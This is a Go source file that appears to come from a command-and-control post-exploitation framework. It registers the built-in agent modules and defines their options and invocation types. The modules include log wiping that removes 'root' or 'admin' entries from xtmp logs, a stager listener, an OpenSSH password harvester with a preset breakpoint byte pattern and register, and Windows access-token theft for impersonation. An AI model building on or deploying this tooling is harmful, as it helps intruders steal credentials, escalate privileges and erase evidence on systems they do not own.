package def

import "sync"

// built-in module names
const (
	ModCLEAN_LOG = "clean_log"

	ModListener     = "listener"
	ModSSHHarvester = "ssh_harvester"
	ModDownloader   = "file_downloader"

	// ModStealToken steals an access token from a running process on Windows.
	// The stolen token is cached in the agent's priv.TokenMap under its SID
	// and can then be referenced by the universal "token" module option.
	ModStealToken = "steal_token"

	// ModListTokens lists all tokens currently cached in the agent's priv.TokenMap,
	// displaying each entry as "DOMAIN\User (SID)" for easy reference.
	ModListTokens = "list_tokens"
)

// ModOption represents a module parameter.
//
// The "type" field unifies validation (C2-side) and wire-packing (agent-side
// for COFF/BOF) into a single declaration.  The loader uses the type for both
// input validation and, when the module is a COFF/BOF, for determining the
// COFFLoader wire-packing token.
//
// Starlark modules are dynamically typed: their parameters are passed to
// main(*args) as positional strings without type coercion. Other non-COFF
// types (bash, python, elf, …) use only the validation semantics; the
// wire-packing semantics are silently ignored.
//
// Type vocabulary
// ───────────────
// Generic (all module kinds):
//
//	string  – UTF-8 text; no numeric constraint.
//	int     – signed 64-bit integer.
//	uint    – unsigned 64-bit integer.
//	bool    – "true"/"false".
//	port    – uint in [1,65535].
//	base64  – arbitrary bytes, user supplies base64-encoded string.
//
// COFF/BOF wire types (also accepted for non-COFF as aliases to the generic
// types above; the extra packing semantics are just ignored). Wire tokens
// follow the COFFLoader beacon_generate.py standard:
//
//	z       – NUL-terminated UTF-8 C-string; aliases: cstr, string, str, lpstr.
//	Z       – NUL-terminated UTF-16LE wide string; aliases: wstr, wstring, lpwstr, w.
//	i       – 32-bit integer; aliases: int, dword, uint32, uint, int32, port, bool.
//	s       – 16-bit short integer; aliases: short, word, int16.
//	b       – length-prefixed binary blob (base64 input); aliases: binary, base64.
//
// ArgvFlag, when non-empty, prefixes the resolved string value in the argv
// list, e.g. "-p" produces ["-p", "<value>"].  Ignored for COFF modules
// (COFF args are passed via the Coff sub-invocation, not argv).
type ModOption struct {
	Name     string   `cbor:"1,keyasint"`  // option name
	Desc     string   `cbor:"2,keyasint"`  // option description
	Val      string   `cbor:"3,keyasint"`  // option value (current / default)
	Vals     []string `cbor:"4,keyasint"`  // allowed values for enum-like options
	Type     string   `cbor:"5,keyasint"`  // unified type (see above)
	Required bool     `cbor:"6,keyasint"`  // whether the option is required
	Pattern  string   `cbor:"7,keyasint"`  // optional regex validation for strings
	Encoding string   `cbor:"8,keyasint"`  // encoding hint (utf8/utf16le) for string/binary
	Secret   bool     `cbor:"9,keyasint"`  // mark sensitive values (avoid logging)
	Min      *float64 `cbor:"10,keyasint"` // numeric lower bound
	Max      *float64 `cbor:"11,keyasint"` // numeric upper bound
	// ArgvFlag, when non-empty, prefixes the value in the argv list.
	// e.g. "-p" produces ["-p", "<value>"].
	ArgvFlag string `cbor:"12,keyasint"`
}

// ModOptions represents multiple module options
type ModOptions map[string]*ModOption

// InvocationArg models a single argv element (literal or param reference).
// Used internally; in JSON only literal/flag entries need to be listed.
type InvocationArg struct {
	Literal string // raw value
	Flag    string // flag prefix, eg. -I
	Param   string // reference to option name
}

// CoffArgSpec defines a COFF argument derived from a parameter.
type CoffArgSpec struct {
	Param    string
	Encoding string
}

// CoffInvocation defines how to invoke a COFF/BOF export
type CoffInvocation struct {
	Export string
	Args   []CoffArgSpec
}

// InvocationSpec defines how to run a module.
//
// The parameter list drives argv ordering and COFF argument packing.
type InvocationSpec struct {
	CoffExport     string
	Argv           []InvocationArg
	StdinParam     string
	TimeoutSeconds int
	Coff           *CoffInvocation // populated internally from parameters

	// DLL module invocation (agent_config.type == "dll").
	DllExport    string // exported symbol to call after loading the DLL
	DllEntry     string // BOF entry function name packed for the DLL loader
	DllFileParam string // parameter that names the BOF file to execute
}

// ResolvedInvocation is the rendered form sent to the agent
type ResolvedInvocation struct {
	Argv           []string                `cbor:"1,keyasint"`
	Stdin          string                  `cbor:"2,keyasint"`
	TimeoutSeconds int                     `cbor:"3,keyasint"`
	Coff           *ResolvedCoffInvocation `cbor:"4,keyasint"`
	// Token is the SID string key into priv.TokenMap for token impersonation.
	// When non-empty on Windows, module execution runs under that token context.
	Token string `cbor:"5,keyasint"`
	// Dependencies are module names that must be loaded before this module.
	// Windows COFF modules use the "coffloader" DLL dependency automatically.
	Dependencies []string `cbor:"6,keyasint"`
	// DLL invocation fields (agent_config.type == "dll").
	DllExport    string `cbor:"7,keyasint"` // exported symbol to call
	DllEntry     string `cbor:"8,keyasint"` // BOF entry function name
	DllFileValue string `cbor:"9,keyasint"` // resolved BOF file path (agent local/memfs)
}

// ResolvedCoffInvocation contains packed COFF args with concrete values
type ResolvedCoffInvocation struct {
	Export string            `cbor:"1,keyasint"`
	Args   []ResolvedCoffArg `cbor:"2,keyasint"`
}

// ResolvedCoffArg holds a typed value to be packed into the COFFLoader BOF
// argument buffer.
// WireType is derived from the parameter's unified Type field.
type ResolvedCoffArg struct {
	WireType string `cbor:"1,keyasint"`
	Value    any    `cbor:"2,keyasint"`
	Encoding string `cbor:"3,keyasint"`
}

// AgentModuleConfig stores configuration data for the agent side
type AgentModuleConfig struct {
	Exec          string   `cbor:"1,keyasint"` // Run this executable file on agent
	Files         []string `cbor:"2,keyasint"` // Files to be uploaded to agent
	InMemory      bool     `cbor:"3,keyasint"` // run this module in memory
	Type          string   `cbor:"4,keyasint"` // "go", "python", "powershell", "bash", "exe", "elf", "dll", "so", "coff"
	IsInteractive bool     `cbor:"5,keyasint"` // whether run as a shell or not, eg. python, bettercap
	WorkDir       string   `cbor:"6,keyasint"` // optional working directory
	NeedsRoot     bool     `cbor:"7,keyasint"` // hint for privilege requirements
}

// ModuleConfig stores the complete module config data
type ModuleConfig struct {
	Name         string            `cbor:"1,keyasint"`  // Display as this name
	Build        string            `cbor:"2,keyasint"`  // Command to run on C2, you can use it to build module
	Author       string            `cbor:"3,keyasint"`  // by whom
	Date         string            `cbor:"4,keyasint"`  // when did you write it
	Comment      string            `cbor:"5,keyasint"`  // describe your module in one line
	IsLocal      bool              `cbor:"6,keyasint"`  // If true, this module is a C2 plugin and doesn't run on agent, use `Build` to specify the command to run
	Platform     string            `cbor:"7,keyasint"`  // targeting which OS? Linux/Windows
	Path         string            `cbor:"8,keyasint"`  // Path to the module directory
	Fileless     bool              `cbor:"9,keyasint"`  // If true, this module doesn't drop files to disk
	Options      ModOptions        `cbor:"10,keyasint"` // module options, will be passed as environment variables to the module, either on C2 or agent side
	AgentConfig  AgentModuleConfig `cbor:"11,keyasint"` // Configuration for agent side
	Invocation   InvocationSpec    `cbor:"12,keyasint"` // how to run the module without run.sh/env
	Dependencies []string          `cbor:"13,keyasint"` // module names that must be loaded before this one (e.g. "coffloader")
}

// Module help info and options
var Modules sync.Map // map[string]*ModuleConfig

func init() {
	populateModules()
}

func populateModules() {
	builtIn := map[string]*ModuleConfig{
		ModCLEAN_LOG: {
			Name:     ModCLEAN_LOG,
			Build:    "",
			Date:     "2020-01-25",
			Comment:  "Delete lines containing keyword from xtmp logs",
			IsLocal:  false,
			Platform: "Linux",
			Path:     "",
			Fileless: true,
			Options: ModOptions{
				"keyword": &ModOption{
					Name: "keyword",
					Desc: "Delete all log entries containing this keyword",
					Vals: []string{"root", "admin"},
					Val:  "root",
				},
			},
			AgentConfig: AgentModuleConfig{
				Exec:          "built-in",
				Files:         []string{},
				InMemory:      false,
				Type:          "go",
				IsInteractive: false,
			},
		},

		ModListener: {
			Name:     ModListener,
			Build:    "",
			Date:     "2020-01-25",
			Comment:  "Start a listener to serve stagers or regular files",
			IsLocal:  false,
			Platform: "Generic",
			Path:     "",
			Fileless: true,
			Options: ModOptions{
				"action": &ModOption{
					Name: "action",
					Desc: "Listener action: start, list, or stop",
					Val:  "start",
					Vals: []string{"start", "list", "stop"},
				},
				"stager": &ModOption{
					Name: "stager",
					Desc: "Path to the stager file to serve, eg. ./stager",
				},
				"port": &ModOption{
					Name: "port",
					Desc: "Port to listen on, eg. 8080",
					Val:  "8080",
				},
				"key": &ModOption{
					Name: "key",
					Desc: "Key to encrypt the stager file",
					Val:  "my_secret_key",
				},
				"type": &ModOption{
					Name: "type",
					Desc: "Listener type: http, tcp, or udp",
					Val:  "http",
					Vals: []string{"http", "tcp", "udp"},
				},
			},
			AgentConfig: AgentModuleConfig{
				Exec:          "built-in",
				Files:         []string{},
				InMemory:      false,
				Type:          "go",
				IsInteractive: false,
			},
		},
		ModSSHHarvester: {
			Name:     ModSSHHarvester,
			Build:    "",
			Date:     "2020-01-25",
			Comment:  "Harvest clear-text password automatically from OpenSSH server process",
			IsLocal:  false,
			Platform: "Linux",
			Path:     "",
			Fileless: true,
			Options: ModOptions{
				"code_pattern": &ModOption{
					Name: "code_pattern",
					Desc: "Code pattern to set breakpoint, big-endian. agent will stop there and dump password, and check RAX to make sure password is valid",
					Val:  "4883c4080fb6c021",
				},
				"reg_name": &ModOption{
					Name: "reg_name",
					Desc: "Register name that stores password, eg. RDI",
					Val:  "RSI",
					Vals: []string{"RDI", "RSI", "RDX", "RCX", "R8", "R9", "RAX", "RBX", "RBP", "RSP", "RIP"},
				},
				"stop": &ModOption{
					Name: "stop",
					Desc: "Stop the harvester: no, yes",
					Val:  "no",
					Vals: []string{"no", "yes"},
				},
			},
			AgentConfig: AgentModuleConfig{
				Exec:          "built-in",
				Files:         []string{},
				InMemory:      false,
				Type:          "go",
				IsInteractive: false,
			},
		},
		ModDownloader: {
			Name:     ModDownloader,
			Build:    "",
			Date:     "2020-01-25",
			Comment:  "Download a file from peers or CC over P2P mesh",
			IsLocal:  false,
			Platform: "Generic",
			Path:     "",
			Fileless: true,
			Options: ModOptions{
				"peer": &ModOption{
					Name: "peer",
					Desc: "Peer agent IP to download from, eg 10.1.1.1",
					Val:  "",
				},
				"path": &ModOption{
					Name: "path",
					Desc: "Path to the file (on server) to download, eg. /tmp/agent.exe",
					Val:  "",
				},
				"checksum": &ModOption{
					Name: "checksum",
					Desc: "SHA256 checksum of the file, used to verify integrity, wont't check if empty",
					Val:  "",
				},
			},
			AgentConfig: AgentModuleConfig{
				Exec:          "built-in",
				Files:         []string{},
				InMemory:      false,
				Type:          "go",
				IsInteractive: false,
			},
		},
	}

	// steal_token – Windows built-in to steal a process token and cache it
	builtIn[ModStealToken] = &ModuleConfig{
		Name:     ModStealToken,
		Build:    "",
		Date:     "2026-08-09",
		Comment:  "Steal a Windows access token from a running process and cache it for impersonation",
		IsLocal:  false,
		Platform: "Windows",
		Path:     "",
		Fileless: true,
		Options: ModOptions{
			"pid": &ModOption{
				Name:     "pid",
				Desc:     "PID of the process to steal the token from",
				Val:      "",
				Type:     "uint",
				Required: true,
			},
		},
		AgentConfig: AgentModuleConfig{
			Exec:          "built-in",
			Files:         []string{},
			InMemory:      false,
			Type:          "go",
			IsInteractive: false,
		},
	}

	// list_tokens – Windows built-in to list all cached impersonation tokens
	builtIn[ModListTokens] = &ModuleConfig{
		Name:     ModListTokens,
		Build:    "",
		Date:     "2026-08-09",
		Comment:  "List all Windows access tokens currently cached in the agent's token store (DOMAIN\\User + SID)",
		IsLocal:  false,
		Platform: "Windows",
		Path:     "",
		Fileless: true,
		Options:  ModOptions{},
		AgentConfig: AgentModuleConfig{
			Exec:          "built-in",
			Files:         []string{},
			InMemory:      false,
			Type:          "go",
			IsInteractive: false,
		},
	}

	for k, v := range builtIn {
		InjectTokenOption(v)
		Modules.Store(k, v)
	}
}

// InjectTokenOption adds the universal "token" option to a module's Options map
// if it is not already present. This allows operators to set a Windows SID so
// that module execution runs under that impersonation token.
func InjectTokenOption(mod *ModuleConfig) {
	if mod.Options == nil {
		mod.Options = make(ModOptions)
	}
	if _, exists := mod.Options["token"]; exists {
		return
	}
	mod.Options["token"] = &ModOption{
		Name: "token",
		Desc: "(Windows) SID of a stolen token to impersonate when running this module; leave empty to run as the current user",
		Val:  "",
		Type: "string",
	}
}
